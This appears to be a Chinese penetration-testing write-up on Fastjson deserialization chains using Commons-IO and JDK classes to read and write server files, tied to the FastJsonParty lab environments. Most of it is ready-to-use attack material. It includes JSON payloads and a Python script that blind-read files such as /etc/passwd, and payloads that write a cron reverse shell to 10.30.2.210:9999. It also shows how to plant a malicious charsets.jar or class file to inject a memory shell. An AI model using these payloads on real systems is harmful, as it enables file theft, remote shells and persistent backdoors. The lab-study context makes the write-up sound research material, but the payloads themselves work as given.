## Commons-IO读写文件
主要写关于Commons IO链写文件的情况，其他依赖不做探究。
## 读文件
```json
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///etc/passwd"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
                    114
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
```
需要能够支持Fastjson回显，利用bool报错按字节读取。
文件读取的地方使用的file协议，在Java下file协议也可以用来探测目录(也可使用netdict协议)，就解决了后面在文件写入时不知道Java安装路径的问题。
利用脚本：

```python
import requests
import json

url = "http://10.30.0.248:8080/login"

#码表可按照实际修改，例如探测jdk目录一般文件名为小写,但也有一些特殊情况
#asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且全为小写 
asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122] #针对linux下正常文件夹或文件读取，去除了一些文件名下不常见的字符，且包含大小写 
# asciis = [10,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126] #所有可见字符


data1 = """
{
    "abc": {
				"@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///usr/local/tomcat/apache-tomcat-8.5.95/webapps/ROOT"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
"""  

data2 = """
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
"""
proxies = {
    'http': '127.0.0.1:8080',
}

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
    "Content-Type": "application/json; charset=utf-8"
}

def byte2str(bytes):
    file_str = ""
    for i in file_byte:
        file_str += chr(int(i))
    print("【" + file_str + "】")

file_byte = []
for i in range(0,30):  # 需要读取多长自己定义，但一次性不要太长，建议分多次读取
    for i in asciis:
        file_byte.append(str(i))
        req = requests.post(url=url,data=data1+','.join(file_byte)+data2,headers=header)
        text = req.text
        
        if "charSequence" not in text:
            file_byte.pop()
    byte2str(file_byte) 
print(file_byte)        

```
## 写文件
JDK8下搭配Commons-IO依赖，写入文件，JDK11下不需要其他依赖。
JDK11：
```json
{
    "@type":"java.lang.AutoCloseable",
    "@type":"sun.rmi.server.MarshalOutputStream",
    "out":
    {
        "@type":"java.util.zip.InflaterOutputStream",
        "out":
        {
           "@type":"java.io.FileOutputStream",
           "file":"/var/spool/cron/root",
           "append":false
        },
        "infl":
        {
            "input":
            {
                "array":"eJzTUtCCwqL8/BIFhaTE4gwF3WQFdQgjU8FOTUE/JbVMvyS5QN/QQM/YQM9Az8JE3xIIFAzs1AzVFbgASkQQSg==",
                "limit":1999
            }
        },
        "bufLen":1048576
    },
    "protocolVersion":1
}
```
JDK8:依赖于commons-io不同版本链不同。
### 写入jsp文件
写入jsp文件相对来说是写文件利用中比较容易的，只要找到tomcat的绝对路径，就可写入jsp文件，且jsp本身并不是二进制文件，直接写就可。可适用于不出网环境。
FastJsonParty对应环境：[1268-writefile-jsp](https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-jsp)

### 写入计划任务反弹shell
这一类别主要针对的是无法写入文件jsp文件，例如jar包起的web服务，不支持解析jsp文件，选择使用写入计划任务反弹shell或写入ssh密钥。
条件：

- 一般需要具备高权限
- 机器出网

可能会遇到的几个问题：
#### 不同系统下计划任务是不同的
在写入计划任务时，ubuntu和centos其实是不一样的,centos下可以写入到两个文件夹下，`/var/spool/cron/root`和`/etc/crontab`，ubuntu下更加局限性，`/var/spool/cron/crontabs/root`下写入需要更改权限为600且重启cron，不考虑，所以仅可以写入到`/etc/crontab`系统级计划任务下，且使用bash -c。
#### 换行问题
通过Fastjson写入计划任务反弹shell时，需在最后跟上`\n`换行符，否则cron无法正确解析，导致反弹shell失败。
像这样 `String code = "* * * * * root bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' \n#";`

#### charsetName与charset
公开的commons-io写文件利用链中针对`WriterOutputStream`的一个参数使用的charsetName,如果在IDEA中调试是不会有任何问题，但对于实际Web环境中是写不了的，而应该改为charset，主要原因是因为IDEA在调试时与实际环境调用`WriterOutputStream`的构造方法不同，就导致了如果本地通过IDEA调试可以成功写入文件，而在实际环境中同样的payload写入的为空文件，需要该charsetName为charset。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697611516039-dfb2227e-a048-4f62-8d36-79ad0b5f7fa0.png#averageHue=%23fefcfb&clientId=u247907cd-f341-4&from=paste&height=130&id=u1c924077&originHeight=163&originWidth=372&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14290&status=done&style=none&taskId=u39241cff-2794-466b-928e-526b1acb7f1&title=&width=297.6)

所以，修改后的payload：

```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""* * * * * root bash -c 'bash -i >& /dev/tcp/10.30.2.210/9999 0>&1' 
#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/etc/crontab",
        "encoding":"UTF-8",
        "append": false
      },
      "charset":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```
FastJsonParty对应环境：[1268-jdk8-writefile](https://github.com/lemono0/FastJsonParty/tree/main/1268-jdk8-writefile) 

### 写入charsets.jar加载jar包

通过写计划任务反弹shell会有一定的局限性：root权限和机器出网，利用起来并不是那么优雅。
后面LandGrey师傅提出了使用[加载charsets.jar的方式rce](https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks),charsets.jar位于Java安装目录下的/jre/lib/下，而本身jar包不同于其他可读文件属于二进制类文件,是无法通过commons-io那条链写入，因此需要使用另一种方法：zlib_compress压缩算法转换字节写入二进制文件。

```json
{"x":{"@type":"java.lang.AutoCloseable","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"java.io.FileOutputStream","file":"c:/charsets.jar","append":false},"infl":{"input":"eJydmgVUXMuW97HQdAik"},"bufLen":1048576}}}
```
Centos下可直接命令行获取：`cat charsets.jar | openssl zlib | base64 -w 0`
在LandGrey师傅提供的charsets.jar中，执行的命令是向/tmp下写入文件，当然也可以自行修改，比如反弹shell等等。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697768881258-f771ce9f-e465-4839-bff7-58d64158ed67.png#averageHue=%232c2c2b&clientId=u488ca4a9-9f3a-4&from=paste&height=417&id=u7ca44a42&originHeight=521&originWidth=974&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77748&status=done&style=none&taskId=ue9fd8fb4-6932-437d-be62-bc0b7099910&title=&width=779.2)
最后重新打包为jar写入即可。
调用charsets.jar，执行代码：
```json
{"x":
  {
  "@type":"java.nio.charset.Charset",
  "val":"500"
	}
}
```
针对不出网利用，更好的方式自然是打内存马了。既然能够在jar包中执行任意代码了，那么自然可以写入执行内存马的操作。
使用的方法是打Fastjson原生反序列化gadget+readObject反序列化执行代码(也可以直接使用defineClass加载字节码)。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697770281415-3f19469d-1490-4d64-875a-14e1d7114b64.png#averageHue=%232e2d2c&clientId=u488ca4a9-9f3a-4&from=paste&height=133&id=u788d2e05&originHeight=166&originWidth=1384&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36819&status=done&style=none&taskId=ub665d4a0-46a9-4ead-883a-ad86e81ad1f&title=&width=1107.2)
最后是关于写入文件的位置。一种是利用公开的jdk目录跑字典，盲打，另一种为使用前面提到的读文件那条链，使用file协议列目录，组合攻击。
加载jar包注入内存马：先转zlib码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697771517495-2a95b1d4-f14e-4790-9e5d-0f3b8e5e8e08.png#averageHue=%23dcdddd&clientId=u488ca4a9-9f3a-4&from=paste&height=310&id=u10d6cbe5&originHeight=388&originWidth=883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=191751&status=done&style=none&taskId=ued583c60-0c9f-41bd-866a-51d7ef14105&title=&width=706.4)

写入文件：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697772150201-4fd549cb-964f-4a62-9e19-32cc0bd157f8.png#averageHue=%23fdfdfd&clientId=u488ca4a9-9f3a-4&from=paste&height=316&id=u58bbbbfd&originHeight=395&originWidth=1164&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88205&status=done&style=none&taskId=u9129e08c-808f-406b-b126-cc1ccbe58f3&title=&width=931.2)

加载charsets.jar：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697772195750-d4ac6ead-f73b-4b10-a1e3-a1dbc2c0a3cf.png#averageHue=%23fdfdfd&clientId=u488ca4a9-9f3a-4&from=paste&height=182&id=u7439835a&originHeight=228&originWidth=1122&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25345&status=done&style=none&taskId=u8c2d932f-78ce-4696-a80a-ab7ff9e9fc3&title=&width=897.6)

内存马注入成功：

![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1697772225198-6321d6d3-b651-419f-9222-fb6e0995e685.png#averageHue=%23cab894&clientId=u488ca4a9-9f3a-4&from=paste&height=125&id=u4904bb6b&originHeight=156&originWidth=955&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7977&status=done&style=none&taskId=uf62d44e7-5357-4270-90fd-8c88ee05d6a&title=&width=764)

局限性：

- charsets.jar加载只能加载一次，也就是说如果服务本身就调动过该jar包就不奏效
- 数据较大，一次机会，谨慎使用
### 写入class类加载
由于加载jar的实现比较臃肿，最致命的还是只能调用一次，就显得不是那么优雅，后来threedr3am师傅提出了向jre/classes/目录下写入class文件类加载，具体原理可看师傅的文章。
同样，我们利用这一原理注入内存马。在上面已经解决了很多问题，这里遇到的问题是很多Jdk中并不存在classes目录，因此需要先自己去创建，利用一位师傅挖出的这条链：[https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew](https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew)

```json
{
 "@type":"java.lang.AutoCloseable",
 "@type":"org.apache.commons.io.output.WriterOutputStream",
 "writer":{
 "@type":"org.apache.commons.io.output.LockableFileWriter",
 "file":"/etc/passwd", //一个存在的文件
 "encoding":"UTF-8",
 "append": true,
"lockDir":"/usr/lib/jvm/java-8-openjdk-amd64/jre/classes" //要创建的目录
 },
 "charset":"UTF-8",
 "bufferSize": 8193,
 "writeImmediately": true
 }
```
后面流程就一样了，制作内存马，写入class文件，最后加载该类：
```json
{
  "@type":"java.lang.AutoCloseable",
  "@type":"EvilShell"  //类名
}
```
注入成功：

